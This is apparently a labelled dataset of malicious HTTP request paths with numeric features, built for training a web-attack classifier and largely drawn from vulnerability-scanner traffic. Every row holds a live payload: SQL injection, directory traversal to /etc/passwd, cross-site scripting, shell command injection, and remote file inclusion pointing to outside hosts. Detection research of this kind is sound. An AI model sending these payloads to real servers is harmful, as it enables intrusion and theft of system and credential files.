method,path,body,path_len,useragent_len,host_len,spaces,curly_open,curly_close,brackets_open,brackets_close,greater_than,lesser_than,single_quote,double_quote,directory,semi_colon,double_dash,amp,blacklist,label 
GET,"/examples/jsp/num/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
",,116,115,0,3,0,0,0,0,0,0,3,0,0,0,1,0,0,1
GET,"/examples/jsp/num/backend/classes.php?include_path=../lib/jinzora.js\x00
",,73,115,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1
GET,"/h4bi26jd.x?<meta http-equiv=set-cookie content=""testhrzx=1150"">
",,65,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331904366&lang_crm=../../vtigerservice.php\x00
",,100,115,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,1
GET,"/pbserver/..\xc0%9v..\xc0%9v..\xc0%9v..\xc0%9v..\xc0%9v../winnt/system32/cmd.exe?/c+dir+c:\+/og
",,96,115,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1
GET,"/cgi-bin/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331904220&lang_crm=../../../../../../../../../../../..//etc/passwd\x00
",,132,115,0,0,0,0,0,0,0,0,0,0,12,0,0,2,0,1
GET,"/?<meta http-equiv=set-cookie content=""testiabz=5220"">
",,55,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/fc9t54l7.cgi?<meta http-equiv=set-cookie content=""testggad=2000"">
",,67,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/3hlysl2x.fts?<script>document.cookie=""testgjbe=8505;""</script>
",,64,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/qczkquis.pl?<script>document.cookie=""testkwlg=5591;""</script>
",,63,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/static//../../../../../../../../etc/passwd
",,44,115,0,0,0,0,0,0,0,0,0,0,8,0,0,0,0,1
GET,"/scripts/check-lom.php?etcdir=http://192.168.202.118:8080/zz5thkvtmlgl?
",,72,115,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,1
GET,"/examples/servlets/servlet/inc/functions.inc.php?config[ppa_root_path]=/etc/passwd\x00
",,87,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/index.php?entry='
",,19,115,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1
GET,"/scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1332008332,1,1,1,1,1,1,1--&blogid=1
",,107,115,0,0,0,0,0,0,0,0,0,0,0,0,1,2,0,1
GET,"/comments.php?scriptpath=http://192.168.202.96:8080/no4ghqiguzhst??
",,68,115,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,1
GET,"/fmnveedu.jspa?<meta http-equiv=set-cookie content=""testgfbr=7014"">
",,68,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/script/template/index.php?main_page_directory=http://192.168.202.96:8080/4dckqcc0acprbz?
",,90,115,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,1
GET,"<meta http-equiv=set-cookie content=""testzgnm=1183"">
",,53,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"<meta http-equiv=set-cookie content=""testkgqo=204"">
",,52,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/mysubscription/
",,17,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/examples/servlets/servlet/lib/owl_api.php?xrms_file_root=../../../../../../../../../../../../etc/passwd\x00
",,109,115,0,0,0,0,0,0,0,0,0,0,12,0,0,0,0,1
GET,"/scripts/buoalakxhatu.cgi
",,26,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/tuwjta1w.kspx?<meta http-equiv=set-cookie content=""testpokn=7494"">
",,68,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/phpmyadmin/menu_dx.php?site_path=../../../../../../../../../../etc/passwd\x00
",,79,115,0,0,0,0,0,0,0,0,0,0,10,0,0,0,0,1
GET,"/r3le3om5.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,72,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/javascript/title.exe
",,22,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/ju0u7kfo.jspa?<script>cross_site_scripting.nasl</script>
",,58,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/scripts/t769qwej0llr.php
",,26,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/hipkz026.php3?<meta http-equiv=set-cookie content=""testyrbs=2855"">
",,68,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/default.php?error_message=<script language=javascript>window.alert(document.cookie);</script>
",,95,115,0,1,0,0,1,1,2,2,0,0,0,0,0,0,0,1
GET,"/scripts/nffhikq061nq.php
",,26,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/top.php?stuff=""rm;q48162266&rem;
",,34,115,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1
GET,"/ows-bin/.passwd
",,17,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/6dlc2zm9.asp?<meta http-equiv=set-cookie content=""testqpux=4016"">
",,67,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/javascript/.htpasswd.sfish
",,28,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/javascript/en.exe
",,19,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/examples/jsp/num/ion-p.exe?page=c:\\winnt\\win.ini
",,52,115,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1
GET,"/en-us/account/a1disp3.cgi?/../../../../../../etc/passwd
",,57,115,0,0,0,0,0,0,0,0,0,0,6,0,0,0,0,1
GET,"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo""+||+echo+db+33+c9+51+52+53+ff+75+00+ff+54+05+04+85+c0+7e+01+c3+68+61+64+00+00+68+54+68++>>esbq
",,150,115,0,0,0,0,0,0,2,0,0,1,0,0,0,1,0,1
GET,"/top.php?stuff=""ping,-w,7000,-n,1,4.3.2.1|rem,
",,47,115,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1
GET,"/1qwv2p5p.php?<meta http-equiv=set-cookie content=""testvqcy=252"">
",,66,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/javascript/error-log.exe
",,26,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/scripts/index.php?action=login&languages[nessus]=syscp_1211.nasl&language=nessus&langs[nessus][0][file]=/etc/passwd
",,117,115,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,1
GET,"/javascript/document.bin
",,25,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/zuihld5m.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,71,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/phpmyadmin/index.php?entry='
",,30,115,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1
GET,"/examples/jsp/sessions/contenido/classes/class.inuse.php?cfg[path][contenido]=/etc/passwd\x00
",,94,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/m2fpztty.php3?<script>cross_site_scripting.nasl</script>
",,58,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/bmeun223.kspx?<meta http-equiv=set-cookie content=""testhhwu=7044"">
",,68,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/main.php?stuff=ping;-w;7000;-n;1;1.2.3.4&rem;
",,47,115,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1
GET,"/scripts/htsearch.cgi
",,22,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/gotopage.cgi?4242+../../../../../../../../../../../../../etc/passwd
",,69,115,0,0,0,0,0,0,0,0,0,0,13,0,0,0,0,1
GET,"/scriptcon/
",,12,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/m2fpztty.dll?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,71,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/phpmyadmin/sql.php?server=000&cfgservers[000][host]=hello&btndrop=no&goto=/etc/passwd
",,87,115,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0,1
GET,"/ao22ww7y.html?<meta http-equiv=set-cookie content=""testqppc=8767"">
",,68,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/examples/jsp/jsp2/jspx/backend/classes.php?include_path=../lib/jinzora.js\x00
",,79,115,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1
GET,"/d765w06j.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,70,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/fastscripts2/
",,15,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/j4drbkil.exe?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,71,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/ikonboard.cgi?act=st&f=1&t=1&hl=nessus&st='
",,45,115,0,0,0,0,0,0,0,0,1,0,0,0,0,4,0,1
GET,"/admin/htmlarea/popups/file/files.php?q=<script>alert('wvs-xss-magic-string-414355592517')</script>&mode=apparel
",,113,115,0,0,0,0,1,1,2,2,2,0,0,0,0,1,0,1
GET,"/bl8sefdm.cgi?<script>cross_site_scripting.nasl</script>
",,57,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/javascript/mlist.exe
",,22,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/scripts/samples/search/filetime.idq
",,37,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/hjdzm96v.dll?<script>document.cookie=""testbyqe=7474;""</script>
",,64,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/javascript/index1.exe
",,23,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/javascript/low.exe
",,20,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/lsoix5h3.cfm?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,71,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/jackrabbit/search.jsp?q=%""<script>alert(1332008604)</script>
",,62,115,0,0,0,0,1,1,2,2,0,1,0,0,0,0,0,1
GET,"/help.php?q=""&del,q66241785&rem,
",,33,115,0,0,0,0,0,0,0,0,0,1,0,0,0,2,0,1
GET,"/8t9v8k7x.php?<meta http-equiv=set-cookie content=""testhvje=9403"">
",,67,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331923197',null,null,null,null --
",,146,115,0,4,0,0,0,0,0,0,2,0,0,0,1,2,0,1
GET,"/cgi-sys/msmmask.exe?mask=/junk334
",,35,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/fpnpp5zg.fts?<script>document.cookie=""testyias=101;""</script>
",,63,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/phpmyadmin/index2.cgi?frames=yes&board=demo&mode=current&threads=collapse&message=../../../../../../../../../../etc/passwd\x00
",,128,115,0,0,0,0,0,0,0,0,0,0,10,0,0,4,0,1
GET,"/9o6g5vkn.exe?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,71,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/y8pmygrp.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,71,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/<script>document.cookie=""testtkio=5454;""</script>
",,51,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/javascript/fuckoff.exe
",,24,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/opensiteadmin/scripts/classes/formmanager.php?path=http://192.168.202.96:8080/vir0v3xfc?\x00
",,94,115,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,1
GET,"/g8nu2yy7.dll?<script>cross_site_scripting.nasl</script>
",,57,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/javascript/sws.exe
",,20,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/javascript/console.exe
",,24,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/nyvbv05h.mscgi?<script>document.cookie=""testftxz=5980;""</script>
",,66,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/quickstore.cgi?nessus&template=../../../../../../../../../../etc/passwd\x00html
",,81,115,0,0,0,0,0,0,0,0,0,0,10,0,0,1,0,1
GET,"/javascript/updater.exe
",,24,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/examples/jsp/num/include/monitoring/engine/makexml.php?fileoreonconf=/etc/passwd\x00
",,86,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/scp.dll/sendto?template=../../../../../../../../../../../../boot.ini\x00gwextranet_template_dir_traversal.nasl
",,112,115,0,0,0,0,0,0,0,0,0,0,12,0,0,0,0,1
GET,"/manager/wordtrans.php?command=show_desc&advanced=1"";id; true ""
",,64,115,0,2,0,0,0,0,0,0,0,2,0,0,0,1,0,1
GET,"/flash-xss/
",,12,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/scripts/index.php?board=nonexistant1452986522
",,47,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/8x6w469u.asp?<script>document.cookie=""testgfjr=1286;""</script>
",,64,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/examples/jsp/jsp2/el/al_initialize.php?alpath=/etc/passwd\x00
",,63,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/l13b77e5.kspx?<meta http-equiv=set-cookie content=""testjvvf=7721"">
",,68,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/help.php?q=""rm q63986192&rem 
",,31,115,0,2,0,0,0,0,0,0,0,1,0,0,0,1,0,1
GET,"/script/_conf/core/common-tpl-vars.php?confdir=@rfiurl?confdir=@rfiurl?
",,72,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/phpmyadmin/index.php?gadget=glossary&action=view&term=<script>alert('jaws_xss.nasl');</script>
",,96,115,0,0,0,0,1,1,2,2,2,0,0,0,0,2,0,1
GET,"/main.php?logout=""del\x0cq94269861&rem\x0c
",,43,115,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1
GET,"/cacti/texis.exe/nessus
",,24,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/javascript/.htpasswd.sfish/-2147483649
",,40,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/databasesubscriptionsthumb/
",,29,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/javascript/hour.exe
",,21,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/cgibin/fileseek.cgi?foot=&head=;cat /etc/passwd|
",,50,115,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,1
GET,"/albums/userpics/copperminer.jpg.php?cat /etc/passwd
",,53,115,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/en-us/account/include/theme.inc.php?fullpath=/etc/passwd\x00
",,62,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/ju0u7kfo.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,72,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/cgi-sys/fileseek2.cgi?foot=&head=;cat /etc/passwd|
",,52,115,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,1
GET,"/javascript/broker.exe
",,23,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/examples/jsp/num/coin_includes/constants.php?_ccfg[_pkg_path_incl]=/etc/passwd\x00
",,84,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/examples/jsp/jsp2/el/admin.php?style=../../../../../../../../../../../../etc/passwd\x00
",,89,115,0,0,0,0,0,0,0,0,0,0,12,0,0,0,0,1
GET,"/examples/jsp/jsp2/jspx/home?dir=/&file=../../../../../../../../../../../../etc/passwd&lang=kor
",,96,115,0,0,0,0,0,0,0,0,0,0,12,0,0,2,0,1
GET,"/x7pclv4s.nsf?<meta http-equiv=set-cookie content=""testiulz=3709"">
",,67,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/main.php?logout='\x0dsleep\x0910\x09#
",,39,115,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1
GET,"/cabela's african safari/
",,26,115,0,2,0,0,0,0,0,0,1,0,0,0,0,0,0,1
GET,"/examples/servlets/servlet/auktion.cgi?menue=../../../../../../../../../etc/passwd
",,83,115,0,0,0,0,0,0,0,0,0,0,9,0,0,0,0,1
GET,"/scripts/upgrade/index.php?steporder[]=../../../../../../../../../../../../etc/passwd\x00
",,90,115,0,0,0,0,0,0,0,0,0,0,12,0,0,0,0,1
GET,"/nmw0do67.php3?<script>cross_site_scripting.nasl</script>
",,58,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/scripts/d3z7yywpyeoa.asp
",,26,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/kernel/loadkernel.php?installpath=/etc/passwd\x00
",,51,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/v3axg1p8.jspa?<script>document.cookie=""testxagh=6987;""</script>
",,65,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/mod_membre/inscription.php?chemin=http://192.168.202.118:8080/moclyxlwqyfjnp??
",,80,115,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,1
GET,"/5qnlm5z2.aspx?<meta http-equiv=set-cookie content=""testsixi=8451"">
",,68,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/en-us/w4996nr0.mscgi?<script>document.cookie=""testttvs=7163;""</script>
",,72,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/examples/jsp/checkbox/forum_2.php?msg=10&return=<script>foo</script>
",,70,115,0,0,0,0,0,0,2,2,0,0,0,0,0,1,0,1
GET,"/ridin'high/
",,13,115,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1
GET,"/?<script>document.cookie=""testyrbs=2855;""</script>
",,52,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/examples/jsp/checkbox/core/editor.php?editor_insert_bottom=/etc/passwd
",,72,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/help.php?q=""&ping\xa0-w\xa08000\xa0-n\xa01\xa04.3.2.1&rem\xa0
",,63,115,0,0,0,0,0,0,0,0,0,1,0,0,0,2,0,1
GET,"/help.php?q=""|ping\x09-w\x0910000\x09-n\x091\x091.2.3.4|rem\x09
",,64,115,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1
GET,"/search.cgi?qt=""<script>alert(412325577727)</script>&search.x=0&search.y=0
",,75,115,0,0,0,0,1,1,2,2,0,1,0,0,0,2,0,1
GET,"/cgi-local/windmail.exe? -n c:\boot.ini hacker@hax0r.com | dir c:\\
",,68,115,0,6,0,0,0,0,0,0,0,0,0,2,0,0,0,1
GET,"/main.php?stuff=""ping\x0b-w\x0b9000\x0b-n\x0b1\x0b1.2.3.4&rem\x0b
",,66,115,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1
GET,"/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1332009302&lang_crm=../../vtigerservice.php\x00
",,100,115,0,0,0,0,0,0,0,0,0,0,2,0,0,2,0,1
GET,"/javascript/.htaccess.sfish/\'\""
",,33,115,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,1
GET,"/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331904405')</script>
",,89,115,0,0,0,0,1,1,2,2,2,0,0,0,0,0,0,1
GET,"/o35zot2r.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,72,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/mod_membre/inscription.php?chemin=http://cirt.net/rfiinc.txt??
",,64,115,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1
GET,"/i2n4v4rl.cfc?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,71,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/examples/servlets/servlet/index.php?include_files[]=&include_files[query_string]=/etc/passwd
",,94,115,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1
GET,"/main.php?stuff=""rm\x09q12267523&rem\x09
",,41,115,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1
GET,"/examples/jsp/error/news.php?prevnext=1'phpnews_prevnext_sql_injection.nasl
",,76,115,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1
GET,"/fc9t54l7.cfm?<script>document.cookie=""testggad=2000;""</script>
",,64,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/cacti/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331909220&lang_crm=../../../../../../../../../../../..//etc/passwd\x00
",,130,115,0,0,0,0,0,0,0,0,0,0,12,0,0,2,0,1
GET,"/cgi-bin/index2.php?_server[]=&_server[remote_addr]='.system('id').exit().'&option=wrapper&module[module]=1
",,108,115,0,0,0,0,2,2,0,0,4,0,0,0,0,3,0,1
GET,"/msvcrt.exe/
",,13,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/scripts/nffhikq061nq.asp
",,26,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/miz4r5hz.cfc?<meta http-equiv=set-cookie content=""testviqu=1270"">
",,67,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/tamambolo_scriptprocdump/
",,27,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/main.php?frm_daynight=day&frm_passwd=&frm_referer=http://192.168.23.202/top.php?stuff=2040844887&frm_user=q23487867&scr_height=&scr_width=
",,140,115,0,0,0,0,0,0,0,0,0,0,0,1,0,5,0,1
GET,"/igtf0zon.fts?<script>cross_site_scripting.nasl</script>
",,57,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
GET,"/ybz5rz7a.x?<meta http-equiv=set-cookie content=""testsbvw=6289"">
",,65,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/javascript/certified.exe
",,26,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/examples/servlets/servlet/user.cgi?url=""><script>alert(""gossamer_links_url_xss.nasl"");</script>&from=add
",,106,115,0,0,0,0,1,1,3,2,0,3,0,0,0,1,0,1
GET,"/scripts/index.php?page=/etc/passwd\x00
",,40,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/33y9gcqq.htm?<meta http-equiv=set-cookie content=""testnvxc=4301"">
",,67,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/opensiteadmin/scripts/classes/formmanager.php?path=http://192.168.202.96:8080/no4ghqiguzhst?\x00
",,98,115,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,1
GET,"/scripting guide/
",,18,115,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/phpmyadmin/search=<script>alert('xss')</script>
",,49,115,0,0,0,0,1,1,2,2,2,0,0,0,0,0,0,1
GET,"/subscriptions.jsf
",,19,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/miz4r5hz.x?<script>document.cookie=""testviqu=1270;""</script>
",,62,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/jdx255ea.jspa?<meta http-equiv=set-cookie content=""testziyq=5055"">
",,68,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/main.php?logout=1:""ls""
",,24,115,0,0,0,0,0,0,0,0,0,2,0,1,0,0,0,1
GET,"/q703m78q.asp?<meta http-equiv=set-cookie content=""testvowq=604"">
",,66,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/cgi-perl/fileseek.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd
",,87,115,0,0,0,0,0,0,0,0,0,0,7,0,0,1,0,1
GET,"/scs86g1p.pl?<script>document.cookie=""testquyx=2820;""</script>
",,63,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/u95h6ymu.pl?<meta http-equiv=set-cookie content=""testkhwc=4028"">
",,66,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/javascript/cgi-shl.exe
",,24,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/top.php?stuff='&uname\x09>q47253924\x09#
",,42,115,0,0,0,0,0,0,1,0,1,0,0,0,0,1,0,1
GET,"/3j8echh0.cfc?<script>document.cookie=""testfuqi=4189;""</script>
",,64,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/javascript/exec.exe
",,21,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/javascript/htpasswd.png
",,25,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1
GET,"/j734qobz.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,72,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/o1zj4u9v.pl?<meta http-equiv=set-cookie content=""testabrn=6368"">
",,66,115,0,2,0,0,0,0,1,1,0,2,0,0,0,0,0,1
GET,"/cacti/k/home?dir=/&file=../../../../../../../../../../../../etc/passwd&lang=kor
",,81,115,0,0,0,0,0,0,0,0,0,0,12,0,0,2,0,1
GET,"/0u75ldxq.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">
",,71,115,0,1,0,0,1,1,1,1,0,2,0,1,0,0,0,1
GET,"/examples/jsp/jsp2/jspx/file.cgi?name=/eventcache/../../../../../../../../../../../boot.ini
",,92,115,0,0,0,0,0,0,0,0,0,0,11,0,0,0,0,1
GET,"/1qwv2p5p.kspx?<script>document.cookie=""testvqcy=252;""</script>
",,64,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/manager/admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=limbo_com_fm_php_shell.nasl-1331904435
",,126,115,0,0,0,0,0,0,0,0,0,0,3,0,0,1,0,1
GET,"/rpxyx07v.idc?<script>document.cookie=""testbnli=1975;""</script>
",,64,115,0,0,0,0,0,0,2,2,0,2,0,0,0,0,0,1
GET,"/cgi-bin/index.php?template=../../../loudblog/custom/config.php\x00
",,68,115,0,0,0,0,0,0,0,0,0,0,3,0,0,0,0,1
GET,"/j2kdmfw4.mscgi?<script>cross_site_scripting.nasl</script>
",,59,115,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,1
